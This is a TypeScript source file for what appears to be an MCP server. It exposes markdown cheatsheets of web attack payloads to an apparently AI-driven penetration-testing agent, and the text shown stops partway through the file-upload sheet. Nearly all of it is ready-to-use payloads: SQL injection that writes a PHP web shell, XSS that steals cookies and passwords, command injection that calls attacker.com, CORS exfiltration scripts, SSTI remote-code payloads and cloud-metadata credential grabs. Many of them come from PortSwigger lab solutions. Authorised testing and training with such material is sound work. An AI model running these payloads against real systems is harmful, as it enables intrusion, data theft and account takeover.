/**
 * MCP Resources — static reference cheatsheets for security testing.
 *
 * Each resource is a battle-tested cheatsheet containing payloads, techniques,
 * filter bypass methods, and verification steps for a specific attack vector.
 * Pull these on-demand during penetration testing for quick reference.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";

export function register(server: McpServer): void {
  // ---------------------------------------------------------------------------
  // 1. SQL Injection Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "sqli_cheatsheet",
    "operant://sqli_cheatsheet",
    { description: "SQL injection payloads, WAF bypasses, blind techniques, UNION methodology, login bypass, file read/write.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://sqli_cheatsheet",
        mimeType: "text/markdown",
        text: `# SQL Injection Cheatsheet

## WHERE Clause Bypass
\`\`\`
GET /filter?category=Gifts'+OR+1=1--
\`\`\`

## Login Bypass
\`\`\`
username=administrator'--&password=anything
\`\`\`

### Auth Bypass Variants
\`\`\`
admin'-- -
' OR 1=1-- -
' OR '1'='1
admin' #
" OR ""="
' OR 1=1/*
' OR 1=1 LIMIT 1-- -
\`\`\`

## UNION-Based Extraction (Step-by-Step)

1. **Determine column count:**
\`\`\`
' ORDER BY 1-- -
\`\`\`
Increment until error.

2. **Find displayable columns:**
\`\`\`
' UNION SELECT 1,2,3-- -
\`\`\`

3. **Extract database info:**
\`\`\`
' UNION SELECT 1,database(),@@version-- -
\`\`\`

4. **Enumerate tables:**
\`\`\`
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
\`\`\`

5. **Enumerate columns:**
\`\`\`
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
\`\`\`

6. **Extract data:**
\`\`\`
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3 FROM users-- -
\`\`\`

## WAF Bypass Techniques
- **Inline comments:** \`SEL/**/ECT\`
- **Case variation:** \`sElEcT\`
- **Hex encoding:** \`0x61646d696e\` (for 'admin')
- **MySQL versioned comments:** \`/*!50000UNION*/\`
- **Double URL encoding:** \`%2527\`

## Time-Based Blind Injection

### MySQL
\`\`\`
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
\`\`\`

### PostgreSQL
\`\`\`
pg_sleep(5)
\`\`\`

Cookie injection example:
\`\`\`
abc'||(SELECT CASE WHEN SUBSTRING(password,{pos},1)='{char}' THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
\`\`\`

### MSSQL
\`\`\`
WAITFOR DELAY '0:0:5'
\`\`\`

## Boolean-Based Blind Injection
Binary search using:
\`\`\`
ASCII(SUBSTRING(database(),1,1))>109-- -
\`\`\`

## File Read
\`\`\`
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3-- -
\`\`\`

## File Write (Web Shell)
\`\`\`
' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3 INTO OUTFILE '/var/www/html/shell.php'-- -
\`\`\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 2. XSS Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "xss_cheatsheet",
    "operant://xss_cheatsheet",
    { description: "Reflected/stored/DOM XSS, filter evasion, WAF bypass, context-specific payloads, cookie theft, XSS-to-CSRF chains, CSP bypass.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://xss_cheatsheet",
        mimeType: "text/markdown",
        text: `# XSS Cheatsheet

## Basic Reflected XSS
\`\`\`
search=<script>alert(1)</script>
\`\`\`

## Filter Evasion Payloads
- **Case variation:** \`<ScRiPt>alert(1)</ScRiPt>\`
- **Event handlers:** \`<img src=x onerror=alert(1)>\`, \`<svg onload=alert(1)>\`
- **Attribute injection:** \`" onfocus=alert(1) autofocus="\`
- **HTML-encoded angles + attribute breakout:** \`" autofocus onfocus=alert(1) x="\`
- **Without parentheses:** \`<img src=x onerror=alert\\\`1\\\`>\`
- **Template literals:** \`\${alert(1)}\`
- **Polyglot:** \`jaVasCript:/*-/*\\\`/*\\\\\\\`/*'/*"/**/(/* */oNcLiCk=alert() )//\`

## DOM XSS Sinks

### innerHTML
Use \`<img src=x onerror=alert(1)>\` (not script tags — innerHTML does not execute script elements).

### document.write
\`\`\`
"><svg onload=alert(1)>
\`\`\`

### JS string context
\`\`\`
'-alert(1)-'
\`\`\`

### Anchor href (jQuery)
\`\`\`
javascript:alert(1)
\`\`\`

### jQuery selector sink with hashchange
Inject via \`location.hash\`.

## WAF Bypass Techniques
- **body onresize via iframe:** Trigger via iframe resizing.
- **Custom HTML elements:** \`<xss id=x onfocus=alert(document.cookie) tabindex=1>#x\`
- **SVG animatetransform onbegin:** SVG animation triggers event handler.
- **Canonical link tag injection with accesskey:** Inject accesskey attribute into canonical tag.

## DOM XSS via eval() Double-Escape
\`\`\`
\\"-alert(1)}//
\`\`\`
Breaks out of JSON string inside eval.

## Stored DOM XSS via replace() vs replaceAll()
\`\`\`
<><img src=1 onerror=alert(1)>
\`\`\`
Bypasses single \`replace()\` call (only strips first match).

## HTML Entity Decode Before JS
\`\`\`
&apos;-alert(1)-&apos;
\`\`\`
Works in onclick handler context where HTML entities are decoded before JS execution.

## XSS-to-CSRF Chain
Stored XSS fetches CSRF token from \`/my-account\`, then sends POST to \`change-email\`:
\`\`\`javascript
fetch('/my-account').then(r=>r.text()).then(html=>{
  const csrf = html.match(/csrf=([^"]+)/)[1];
  fetch('/change-email', {method:'POST', body:'csrf='+csrf+'&email=attacker@evil.com'});
});
\`\`\`

## CSP Bypass via Dangling Markup
When there is no \`form-action\` directive in CSP — inject a new form element pointing to an exploit server to exfiltrate data.

## Cookie Theft + Offline Cracking
Cookie format: \`base64(username:md5(password))\`
Decode base64, extract MD5 hash, crack offline.

## Lab: Exploiting XSS to steal cookies (PortSwigger)
- Stored XSS in blog comments exfiltrates cookies via self-posting (no external server needed)
- Extract CSRF token from same-origin page, then POST stolen \`document.cookie\` as a new comment
- Payload: \`<script>var x=new XMLHttpRequest();x.open("GET","/post?postId=5",false);x.send();var c=x.responseText.match(/csrf" value="([^"]+)"/)[1];var y=new XMLHttpRequest();y.open("POST","/post/comment",false);y.setRequestHeader("Content-Type","application/x-www-form-urlencoded");y.send("csrf="+c+"&postId=5&comment="+encodeURIComponent(document.cookie)+"&name=a&email=a@a.com&website=http://a.com")</script>\`

## Lab: Exploiting XSS to capture passwords (PortSwigger)
- Inject fake login form inputs to trigger browser credential autofill
- \`onchange\` event on password field exfiltrates autofilled username+password
- Self-exfiltration pattern: post credentials back as a blog comment
- Payload: \`<input name=username id=xuser><input type=password name=password onchange="fetch('/post?postId=5').then(r=>r.text()).then(t=>{var c=t.match(/csrf.*?value=&quot;([^&]+)/)[1];fetch('/post/comment',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+c+'&postId=5&comment='+document.getElementById('xuser').value+':'+this.value+'&name=s&email=s@s.com&website=http://s.com'})})">\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 3. Command Injection Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "cmdi_cheatsheet",
    "operant://cmdi_cheatsheet",
    { description: "Command injection operators, space/keyword/slash filter bypasses, blind detection, output redirection.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://cmdi_cheatsheet",
        mimeType: "text/markdown",
        text: `# Command Injection Cheatsheet

## Simple Pipe Injection
\`\`\`
productId=1&storeId=1|whoami
\`\`\`

## Injection Operators
- \`;\` — Command separator
- \`&&\` — AND (runs second if first succeeds)
- \`||\` — OR (runs second if first fails)
- \`|\` — Pipe (passes output)
- Backticks — Command substitution
- \`$(command)\` — Command substitution
- \`%0a\` — Newline (URL-encoded)

## Space Filter Bypass
\`\`\`
{cat,/etc/passwd}
cat\${IFS}/etc/passwd
cat$IFS$9/etc/passwd
cat</etc/passwd
\`\`\`

## Keyword Filter Bypass
\`\`\`
c'a't /etc/passwd
c"a"t /etc/passwd
\\c\\a\\t /etc/passwd
cat /etc/pas*
\`\`\`

## Slash Filter Bypass
\`\`\`
\${HOME:0:1}
\`\`\`
Produces \`/\`.

## Hex Encoding
\`\`\`
$(printf '\\x63\\x61\\x74') /etc/passwd
\`\`\`

## Blind Detection
\`\`\`
; sleep 5
; curl http://attacker.com/$(whoami)
; whoami > /var/www/html/output.txt
\`\`\`

## Blind via Double-Pipe
\`\`\`
||sleep 10||
\`\`\`
Runs regardless of prior command exit status.

## Output Redirection
\`\`\`
||whoami > /var/www/images/output.txt||
\`\`\`
Then retrieve via image endpoint.
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 4. Path Traversal Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "path_traversal_cheatsheet",
    "operant://path_traversal_cheatsheet",
    { description: "Traversal sequences, encoding bypasses, key target files for path traversal attacks.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://path_traversal_cheatsheet",
        mimeType: "text/markdown",
        text: `# Path Traversal Cheatsheet

## Simple Traversal
\`\`\`
GET /image?filename=../../../etc/passwd
\`\`\`

## Encoding Bypasses
- **URL-encoded:** \`%2e%2e%2f\`
- **Double-encoded:** \`%252e%252e%252f\`
- **Null-byte termination:** \`../../../etc/passwd%00.txt\`
- **Backslash (Windows):** \`..\\..\\..\\windows\\win.ini\`

## Key Target Files

### Linux
- \`/etc/passwd\`
- \`/etc/shadow\`
- \`/var/www/html/config.php\`
- \`/proc/self/environ\`
- \`.env\`

### Windows
- \`web.config\`
- \`web.xml\`
- \`applicationhost.config\`

## Lab: File path traversal - null byte bypass (PortSwigger)
- Null byte injection (%00) bypasses file extension validation
- Server validates extension (.jpg/.png) but filesystem terminates at null byte
- Works on older PHP and C-based file operations
- Payload: \`../../../etc/passwd%00.jpg\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 5. SSRF Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "ssrf_cheatsheet",
    "operant://ssrf_cheatsheet",
    { description: "Localhost bypass variants, allow/deny list bypasses, DNS rebinding, cloud metadata endpoints, XXE-to-SSRF, XInclude.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://ssrf_cheatsheet",
        mimeType: "text/markdown",
        text: `# SSRF Cheatsheet

## Deny List Bypass (Localhost Variants)
- \`0\`
- \`0.0.0.0\`
- \`127.1\`
- \`2130706433\` (decimal)
- \`0x7f000001\` (hex)
- \`017700000001\` (octal)
- \`[::1]\` (IPv6)

## Combined Bypass (IP + Keyword)
Use \`127.1\` for IP bypass + \`%2561dmin\` (double-URL-encode) for keyword bypass:
\`\`\`
stockApi=http://127.1/%2561dmin/delete?username=carlos
\`\`\`

## Allow List Bypass
- \`allowed-domain.attacker.com\`
- \`https://allowed-domain@attacker.com\`
- \`https://allowed-domain#@attacker.com\`

## Open Redirect Chaining
Chain an open redirect on the allowed domain to redirect internally.

## DNS Rebinding
\`\`\`
127.0.0.1.nip.io
\`\`\`

## Cloud Metadata Endpoints

### AWS
\`\`\`
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
\`\`\`

### GCP
\`\`\`
http://metadata.google.internal/computeMetadata/v1/
\`\`\`
Required header: \`Metadata-Flavor: Google\`

### Azure
\`\`\`
http://169.254.169.254/metadata/instance?api-version=2021-02-01
\`\`\`
Required header: \`Metadata: true\`

## XXE to SSRF
\`\`\`xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
\`\`\`

## XInclude
\`\`\`xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
\`\`\`

## Vulnerable Parameters to Test
\`url\`, \`uri\`, \`path\`, \`src\`, \`dest\`, \`redirect\`, \`page\`, \`feed\`, \`host\`, \`site\`, \`html\`, \`data\`, \`reference\`, \`callback\`

## Lab: SSRF with filter bypass via open redirection (PortSwigger)
- Chain SSRF through open redirect at \`/product/nextProduct\` to bypass SSRF URL filters
- Use \`%26\` encoding to embed \`&\` within nested URL parameter
- Payload: \`stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos\`

## Lab: Exploiting blind XXE to retrieve data via error messages (PortSwigger)
- Host malicious DTD on external server with parameter entity chaining
- DTD defines \`%file\` (reads target file), \`%eval\` (builds error entity referencing \`%file\`), triggers file-not-found error containing file contents
- Payload DTD: \`<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 6. Clickjacking Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "clickjacking_cheatsheet",
    "operant://clickjacking_cheatsheet",
    { description: "Iframe overlay, form prefilling, frame buster bypass with sandbox, clickjacking+DOM XSS combo, multistep clickjacking.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://clickjacking_cheatsheet",
        mimeType: "text/markdown",
        text: `# Clickjacking Cheatsheet

## Basic Clickjacking
Invisible iframe overlay with a decoy button positioned over a real action:
\`\`\`html
<style>
  iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 2; }
  .decoy { position: absolute; top: 300px; left: 200px; z-index: 1; }
</style>
<div class="decoy">Click here for a prize!</div>
<iframe src="https://target.com/delete-account"></iframe>
\`\`\`

## Form Prefilling via URL Parameters
Iframe loads a page with form values pre-populated via GET parameters:
\`\`\`html
<iframe src="https://target.com/my-account?email=attacker@evil.com"></iframe>
\`\`\`

## Frame Buster Bypass
Use \`sandbox="allow-forms"\` to disable JavaScript (frame buster) but still allow form submission:
\`\`\`html
<iframe sandbox="allow-forms" src="https://target.com/change-email"></iframe>
\`\`\`

## Clickjacking + DOM XSS Combo
If a feedback form has DOM XSS via innerHTML, prefill the form with an XSS payload:
\`\`\`html
<iframe src="https://target.com/feedback?message=<img src=x onerror=alert(1)>"></iframe>
\`\`\`

## Multistep Clickjacking
Two-step attack with decoy buttons for "Delete account" then "Yes" confirmation:
\`\`\`html
<style>
  .step1 { position: absolute; top: 300px; left: 200px; }
  .step2 { position: absolute; top: 400px; left: 200px; display: none; }
</style>
<div class="step1" onclick="this.style.display='none'; document.querySelector('.step2').style.display='block'">Click me</div>
<div class="step2">Confirm</div>
<iframe src="https://target.com/account/delete"></iframe>
\`\`\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 7. Authentication Attacks Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "auth_attacks_cheatsheet",
    "operant://auth_attacks_cheatsheet",
    { description: "Username enumeration, rate limit bypass, 2FA bypass, cookie-based auth attacks, password reset poisoning.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://auth_attacks_cheatsheet",
        mimeType: "text/markdown",
        text: `# Authentication Attacks Cheatsheet

## Username Enumeration

### Response Difference
Different error messages for valid vs invalid usernames:
- Invalid user: \`"Invalid username or password."\`
- Valid user: \`"Invalid username or password "\` (trailing space or different wording)

### Timing / bcrypt
Send a 200+ character password. Valid usernames trigger bcrypt hashing (~2.8s), invalid usernames fail fast (~1.4s).

### Lockout Oracle
Send 5 attempts per candidate username. Valid usernames trigger account lockout; invalid ones never lock.

### Password Change Form
Mismatched new passwords reveal different error messages depending on whether the current password is correct vs wrong.

## Rate Limit Bypass

### X-Forwarded-For Rotation
Rotate \`X-Forwarded-For\` header values with each request to appear as different IPs:
\`\`\`
X-Forwarded-For: 1.2.3.{i}
\`\`\`

### Interleaved Logins
A successful login resets the failure counter. Interleave valid credential logins between brute-force attempts.

## 2FA Bypass
Change the \`verify\` cookie from your user to the target user, then brute-force the 4-digit code:
\`\`\`
Cookie: verify=carlos
\`\`\`
Try all codes 0000–9999.

## Cookie-Based Auth Attacks
Cookie format: \`base64(username:md5(password))\`
Generate cookies with candidate password MD5 hashes and test each one.

## Password Reset Poisoning
Add \`X-Forwarded-Host: exploit-server\` to the password reset request. The reset link with token is sent to the victim but constructed using the attacker's host:
\`\`\`
POST /forgot-password
Host: target.com
X-Forwarded-Host: exploit-server.com
Content-Type: application/x-www-form-urlencoded

username=carlos
\`\`\`
The reset email will contain \`https://exploit-server.com/reset?token=SECRET\`.
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 8. JWT Attacks Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "jwt_attacks_cheatsheet",
    "operant://jwt_attacks_cheatsheet",
    { description: "Weak key cracking, JWK header injection, JKU header injection, KID path traversal to /dev/null.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://jwt_attacks_cheatsheet",
        mimeType: "text/markdown",
        text: `# JWT Attacks Cheatsheet

## Weak Key Cracking (HS256)
Common weak secrets: \`secret1\`, \`password\`, \`key\`

Crack with hashcat:
\`\`\`bash
hashcat -m 16500 jwt.txt /path/to/wordlist.txt
\`\`\`
Once the key is known, forge tokens with any claims.

## JWK Header Injection
Embed the attacker's public key directly in the JWT \`jwk\` header, sign with the corresponding private key:
\`\`\`json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "ATTACKER_PUBLIC_KEY_N",
    "e": "AQAB"
  }
}
\`\`\`
The server trusts the embedded key to verify the signature.

## JKU Header Injection
Host a JWKS (JSON Web Key Set) on an exploit server at \`/.well-known/jwks.json\`, then point the JWT \`jku\` header to it:
\`\`\`json
{
  "alg": "RS256",
  "jku": "https://exploit-server.com/.well-known/jwks.json"
}
\`\`\`
The server fetches the attacker's JWKS and uses it to verify the forged token.

## KID Path Traversal to /dev/null
Set \`kid\` to a path traversal pointing to \`/dev/null\` (empty file), then sign with an empty string key using HS256:
\`\`\`json
{
  "alg": "HS256",
  "kid": "../../../../../../../dev/null"
}
\`\`\`
Sign the token with an empty string (\`""\`) as the secret key.
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 9. CSRF Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "csrf_cheatsheet",
    "operant://csrf_cheatsheet",
    { description: "Token validation bypasses, Referer exploits, SameSite bypasses including method override, client-side redirect, sibling domain XSS, Chrome 2-minute exemption.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://csrf_cheatsheet",
        mimeType: "text/markdown",
        text: `# CSRF Cheatsheet

## Token Validation Bypasses

### Method-Based Bypass
Server validates CSRF token on POST but not GET:
\`\`\`html
<img src="https://target.com/change-email?email=attacker@evil.com">
\`\`\`

### Cross-Session Token (Token Not Tied to Session)
Use the attacker's own valid CSRF token for the victim's session.

### CRLF Injection to Set Cookie
Inject a cookie containing the attacker's CSRF key:
\`\`\`
/?search=test%0d%0aSet-Cookie: csrfKey=ATTACKER_VALUE
\`\`\`

### Duplicate Cookie-to-Body
Server checks that CSRF token in body matches cookie, but does not validate against server-side store. Set a fake cookie via CRLF injection.

## Referer Exploits

### Referer Suppression
\`\`\`html
<meta name="referrer" content="no-referrer">
\`\`\`
If the server only checks Referer when present, suppressing it bypasses the check.

### Referer Spoofing via pushState
\`\`\`javascript
history.pushState('', '', '/?target-domain.com');
\`\`\`
Combined with \`Referrer-Policy: unsafe-url\`, the Referer header will contain the target domain.

## SameSite Bypasses

### Method Override (SameSite=Lax)
SameSite=Lax allows GET but not POST. Use \`_method=POST\` parameter override:
\`\`\`html
<form method="GET" action="https://target.com/change-email">
  <input name="_method" value="POST">
  <input name="email" value="attacker@evil.com">
</form>
\`\`\`

### Client-Side Redirect (SameSite=Strict)
Exploit a path traversal in a client-side redirect parameter to navigate within the same site context.

### Sibling Domain XSS (SameSite=Strict)
XSS on a same-site sibling domain (e.g., \`cms.target.com\`) to hijack WebSocket connections on the main domain.

### Chrome 2-Minute Exemption (SameSite=Lax)
Force a cookie refresh via popup window, then auto-submit the CSRF form within 2 minutes of the cookie being set. Chrome exempts Lax cookies from SameSite restrictions for top-level POST navigations within 2 minutes of creation.
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 10. CORS Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "cors_cheatsheet",
    "operant://cors_cheatsheet",
    { description: "Origin reflection exploitation, trusted null origin exploitation via sandboxed iframe.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://cors_cheatsheet",
        mimeType: "text/markdown",
        text: `# CORS Cheatsheet

## Origin Reflection
Server reflects any Origin back in the \`Access-Control-Allow-Origin\` header with \`Access-Control-Allow-Credentials: true\`.

Exploit:
\`\`\`javascript
fetch('https://target.com/api/sensitive-data', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  // Exfiltrate data to attacker server
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
\`\`\`
Host this on \`attacker.com\` and lure the victim to visit. The victim's cookies are sent along, and the response is readable because the server allows the attacker's origin.

## Lab: CORS trusted insecure protocols (PortSwigger)
- CORS policy trusts all subdomains regardless of protocol (including HTTP)
- Chain XSS on an HTTP subdomain as a CORS stepping stone to steal data from HTTPS origin
- Use \`XMLHttpRequest\` with \`withCredentials=true\` for authenticated cross-origin reads
- Payload: \`document.location="http://stock.TARGET/?productId=1<script>var req=new XMLHttpRequest();req.onload=reqListener;req.open('get','https://TARGET/accountDetails',true);req.withCredentials=true;req.send();function reqListener(){location='https://EXPLOIT/log?key='+this.responseText;}</script>&storeId=1"\`

## Trusted Null Origin
Server trusts \`Origin: null\` (whitelisted).

Exploit with a sandboxed iframe using \`srcdoc\` (sends \`Origin: null\`):
\`\`\`html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <script>
    fetch('https://target.com/api/sensitive-data', {credentials: 'include'})
    .then(r => r.json())
    .then(data => {
      parent.postMessage(JSON.stringify(data), '*');
    });
  </script>
"></iframe>
<script>
  window.addEventListener('message', function(e) {
    fetch('https://attacker.com/steal?data=' + e.data);
  });
</script>
\`\`\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 11. Access Control Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "access_control_cheatsheet",
    "operant://access_control_cheatsheet",
    { description: "IDOR via GUIDs/chat transcripts, password disclosure in hidden inputs, data leakage in redirects, role modification, Referer-based bypass, X-Original-URL bypass, HTTP method switching.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://access_control_cheatsheet",
        mimeType: "text/markdown",
        text: `# Access Control Cheatsheet

## IDOR via Unpredictable GUIDs from Public Sources
Blog post author links reveal GUID format. Use the discovered GUID to access other users' accounts:
\`\`\`
GET /my-account?id={discovered-guid}
\`\`\`

## IDOR via Chat Transcripts
\`\`\`
GET /download-transcript/1.txt
GET /download-transcript/2.txt
\`\`\`
Reveals other users' sensitive data (credentials, API keys) in conversation history.

## Password Disclosure in Hidden Inputs
Admin password often leaked in hidden HTML input fields on account pages or admin panels:
\`\`\`html
<input type="hidden" name="password" value="s3cretP@ss">
\`\`\`
Inspect the HTML source of account management pages.

## Data Leakage in Redirects
Server responds with 302 redirect but still returns data in the response body. Use curl to capture:
\`\`\`bash
# Follow redirect (may miss leaked data):
curl -L https://target.com/admin

# Capture leaked data before redirect:
curl https://target.com/admin
\`\`\`

## Role Modification via JSON Response Fields
User profile update endpoints return JSON with \`roleid\`, \`admin\`, or \`is_admin\` fields. Modify these in the request body to elevate privileges:
\`\`\`json
{"username": "james.wilson", "email": "james@test.com", "roleid": 1}
\`\`\`
\`\`\`json
{"username": "james.wilson", "is_admin": true}
\`\`\`

## Referer-Based Access Control Bypass
Server trusts the \`Referer\` header to authorize admin actions:
\`\`\`bash
curl -H "Referer: https://target.com/admin" https://target.com/admin/delete?user=carlos
\`\`\`

## X-Original-URL Header Bypass
Front-end blocks \`/admin\` (403), but back-end routes via \`X-Original-URL\` header:
\`\`\`bash
curl -H "X-Original-URL: /admin/delete" "https://target.com/?username=carlos"
\`\`\`
Query parameters go on the main URL, path goes in the header.

## HTTP Method Switching
Access control only restricts POST requests. Send the same request as GET to bypass:
\`\`\`bash
# Blocked:
curl -X POST https://target.com/admin/delete -d "username=carlos"

# Bypass:
curl "https://target.com/admin/delete?username=carlos"
\`\`\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 12. Business Logic Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "business_logic_cheatsheet",
    "operant://business_logic_cheatsheet",
    { description: "Client-side price manipulation, negative quantity, domain-specific access, coupon alternation, API price manipulation via PATCH, parameter removal bypass, workflow bypass, state machine bypass.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://business_logic_cheatsheet",
        mimeType: "text/markdown",
        text: `# Business Logic Cheatsheet

## Client-Side Price Manipulation
Hidden \`price\` input in the checkout form is fully controllable:
\`\`\`html
<input type="hidden" name="price" value="1">
\`\`\`
Modify from retail to \`0.01\` or \`1\`.

## Negative Quantity Attacks
Add a negative quantity of a cheaper product to offset total cost:
\`\`\`
quantity=-16&product=cheap-item
\`\`\`
The negative value subtracts from the cart total.

## Inconsistent Security Controls Across Domains
Admin functionality accessible via specific email domains even if registration normally blocks them. Identify the required domain and register with it.

## Coupon Alternation Bypass
Repeatedly apply and remove different coupon codes to compound discounts and bypass "already applied" enforcement:
1. Apply COUPON_A
2. Apply COUPON_B
3. Remove COUPON_A
4. Apply COUPON_A again
Repeat to compound beyond intended limits.

## API Price Manipulation via PATCH
1. Discover price API endpoints from JS bundles.
2. Send \`OPTIONS\` to reveal allowed HTTP methods.
3. Use \`PATCH\` to modify the price:
\`\`\`bash
curl -X OPTIONS https://target.com/api/products/1
# Response: Allow: GET, PATCH, OPTIONS

curl -X PATCH https://target.com/api/products/1 \\
  -H "Content-Type: application/json" \\
  -d '{"price": 0}'
\`\`\`

## Parameter Removal Bypass
Drop required parameters (e.g., \`current-password\`) from the request. The server skips validation for missing parameters:
\`\`\`bash
# Normal request:
curl -X POST https://target.com/change-password -d "current-password=old&new-password=new"

# Bypass (drop current-password):
curl -X POST https://target.com/change-password -d "new-password=new"
\`\`\`

## Workflow Bypass
Navigate directly to the order-confirmation endpoint, skipping payment:
\`\`\`
GET /order-confirmation?orderId=123
\`\`\`

## State Machine Bypass
Drop the role-selector redirect. The server assigns the default role (often admin):
\`\`\`
POST /register
\`\`\`
If the server expects a redirect to \`/role-selector\` but the response is intercepted, the default role is assigned.

## Lab: Infinite money logic flaw (PortSwigger)
- Gift card arbitrage: buy discounted gift cards with coupon, redeem at full value, net profit per cycle
- Automated loop: add gift card → apply coupon → checkout → extract code from confirmation → redeem
- Business logic flaw: coupon reusable across orders + gift cards redeemable at face value
- Payload: Loop \`POST /cart\` + \`POST /cart/coupon\` + \`POST /cart/checkout\` + \`POST /gift-card\`

## Lab: Authentication bypass via encryption oracle (PortSwigger)
- Shared encryption key between \`stay-logged-in\` and \`notification\` cookies
- Blog comment invalid email creates encryption oracle ("Invalid email address: INPUT")
- Pad input to align prefix to block boundary (e.g., 9 chars → prefix = 32 bytes = 2 blocks), strip prefix blocks
- Payload: Submit email \`xxxxxxxxxadministrator:TIMESTAMP\`, strip first 2 blocks from notification cookie, use as stay-logged-in
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 13. SSTI Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "ssti_cheatsheet",
    "operant://ssti_cheatsheet",
    { description: "Server-Side Template Injection detection and exploitation: ERB, Tornado, Freemarker, Handlebars, Django payloads.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://ssti_cheatsheet",
        mimeType: "text/markdown",
        text: `# SSTI (Server-Side Template Injection) Cheatsheet

## Detection
\`\`\`
{{7*7}}
\`\`\`
If the output is \`49\`, template injection is confirmed.

### Engine Fingerprinting
\`\`\`
{{7*'7'}}
\`\`\`
- Returns \`7777777\` → **Jinja2** (Python)
- Returns \`49\` → **Twig** (PHP)

## ERB (Ruby on Rails)
\`\`\`
<%= system('whoami') %>
<%= system('cat /etc/passwd') %>
\`\`\`

## Tornado (Python)
\`\`\`
}}{% import os %}{{os.popen('whoami').read()}}
}}{% import os %}{{os.popen('cat /etc/passwd').read()}}
\`\`\`

## Freemarker (Java)
\`\`\`
<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("whoami")}
<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("cat /etc/passwd")}
\`\`\`

## Handlebars (Node.js)
\`\`\`
{{#with "s" as |string|}}...require('child_process').execSync('whoami')...{{/with}}
\`\`\`

## Django (Python)
Django templates are sandboxed — no RCE. Use for information disclosure:
\`\`\`
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
\`\`\`
`
      }]
    })
  );

  // ---------------------------------------------------------------------------
  // 14. File Upload Cheatsheet
  // ---------------------------------------------------------------------------
  server.resource(
    "file_upload_cheatsheet",
    "operant://file_upload_cheatsheet",
    { description: "Web shell upload, Content-Type bypass, .htaccess extension bypass for file upload attacks.", mimeType: "text/markdown" },
    async () => ({
      contents: [{
        uri: "operant://file_upload_cheatsheet",
        mimeType: "text/markdown",
        text: `# File Upload Cheatsheet

## Web Shell Upload
Upload a PHP web shell:
\`\`\`php
<?php echo file_get_contents("/home/carlos/secret"); ?>
\`\`\`

Upload to \`/files/avatars/shell.php\`, then access:
\`\`\`
GET /files/avatars/shell.php
\`\`\`

## Content-Type Bypass
Server validates Content-Type but not file extension. Upload \`.php\` with an image Content-Type:
\`\`\`bash
curl -X POST https://target.com/upload \\
  -F "file=@shell.php;type=image/jpeg"
\`\`\`

## Extension Blacklist Bypass via .htaccess

### Step 1: Upload .htaccess
Upload a \`.htaccess\` file that maps a custom extension to PHP:
\`\`\`
AddType application/x-httpd-php .l33t
